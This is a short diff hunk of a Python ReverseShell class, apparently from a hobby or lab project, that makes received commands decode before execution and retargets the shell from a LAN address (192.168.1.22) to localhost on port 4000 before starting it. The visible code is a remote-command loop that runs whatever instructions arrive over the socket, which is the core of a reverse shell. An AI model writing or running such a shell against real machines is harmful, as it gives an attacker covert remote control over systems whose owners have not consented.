@@ -46,11 +46,11 @@ class ReverseShell:
 
         while self.isRunning:
 
-            self.executeOrder(self.client.recvfrom(1024)[0])
+            self.executeOrder(self.client.recvfrom(1024)[0].decode())
 
 
 """
 -----------------------------------------------------
 """
-shell = ReverseShell("192.168.1.22", 4000)
+shell = ReverseShell("127.0.0.1", 4000)
 shell.run()
